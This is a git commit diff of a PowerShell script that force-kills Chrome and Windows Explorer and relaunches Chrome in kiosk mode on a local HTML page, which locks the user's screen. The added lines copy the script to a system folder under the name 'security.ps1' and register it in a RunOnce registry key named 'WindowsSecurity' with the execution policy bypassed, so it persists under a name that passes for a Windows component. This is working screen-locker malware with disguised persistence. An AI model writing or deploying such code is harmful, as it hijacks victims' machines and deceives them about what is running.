f171ca6cf9484889b3a43b67fd7e183220156316
m00nbyt3 <moon_byte@protonmail.com>
2025-02-11 09:22:15 +0100

    added persistence and shortcut also in git repo

--- v2/script.ps1
+++ v2/script.ps1
@@ -1,5 +1,9 @@
 Stop-Process -Name 'chrome' -Force;
 Start-Process 'taskkill.exe' -ArgumentList '-F -IM explorer.exe';
 
-$fullPath = Resolve-Path .\index.html
+$fullPath = Resolve-Path .\index.html;
 Start-Process 'chrome.exe' -ArgumentList "--kiosk $fullPath";
+
+Copy-Item -Path "./script.ps1" -Destination "C:\Windows\tracing\security.ps1";
+
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "WindowsSecurity" /t REG_SZ /d "powershell.exe -ExecutionPolicy Bypass -File C:\Windows\tracing\security.ps1" /f
